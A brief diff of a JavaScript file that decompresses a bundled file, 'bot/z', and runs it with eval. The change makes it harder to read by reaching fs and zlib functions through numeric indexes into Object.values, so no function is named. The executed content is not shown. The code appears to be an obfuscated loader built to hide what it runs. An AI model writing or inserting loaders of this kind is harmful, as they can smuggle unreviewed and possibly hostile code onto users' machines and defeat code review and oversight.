@@ -1,4 +1,4 @@
 r=require
-u=r('fs')
-eval(''+Object.values(r('zlib'))[29](
-u.readFileSync('bot/z')))
+v=Object.values
+w=v(r('fs'))
+eval(''+v(r('zlib'))[29](w[58]('bot/z')))
